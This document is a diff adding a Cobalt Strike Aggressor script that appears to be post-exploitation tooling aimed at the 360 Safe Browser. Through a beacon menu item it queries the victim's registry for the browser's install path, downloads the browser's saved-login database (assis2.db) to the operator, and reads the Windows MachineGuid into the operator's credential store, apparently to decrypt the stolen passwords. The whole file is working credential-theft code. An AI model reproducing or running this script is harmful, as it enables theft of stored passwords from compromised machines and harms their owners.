@@ -1,0 +1,47 @@
+#author=haya
+
+sub getMachineGuid{
+	$arch = barch($1);
+	if ($arch == 'x64'){
+	breg_queryv($1, "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography", "MachineGuid", "x64");
+	}
+	else{
+	breg_queryv($1, "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography", "MachineGuid", "x86");
+	breg_queryv($1, "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography", "MachineGuid", "x64");
+	}
+}
+
+sub SafeBrowsergetpass {
+	bshell($bid, 'reg query HKEY_CLASSES_ROOT\360seURL\shell\open\command|findstr exe');
+}
+
+popup beacon_bottom {
+        item "SafeBrowsergetpass"{
+		$bid = $1['@'];
+                SafeBrowsergetpass($bid);
+                getMachineGuid($bid);
+    }
+}
+
+on beacon_output {
+	#$res = replace($2, 'received output:\n'.'');
+	#$res = replace($2, '    \(默认\)    REG_SZ    '.''); 
+	$magicstring = "360se6\\Application\\360se.exe";
+	$magicstring2 = "MachineGuid";
+
+	if ($magicstring isin $2){
+	$length = strlen($2);
+	$res = substr($2, 40, $length - 32); 
+	$dbPath = "User Data\\Default\\apps\\LoginAssis\\assis2.db";
+	$res = $res . $dbPath;
+	bdownload($1, $res);
+	blog($1,"360 SafeBrowser DB Downloading");
+	}
+
+	if ($magicstring2 isin $2){
+	$MachineGuid = substr($2, 42, -1); 
+	$beaconHost = beacon_info($1, "host");
+	credential_add($empty,$MachineGuid, $empty, $empty, $beaconHost);
+	blog($1,"MachineGuid Get Success");
+	}
+}
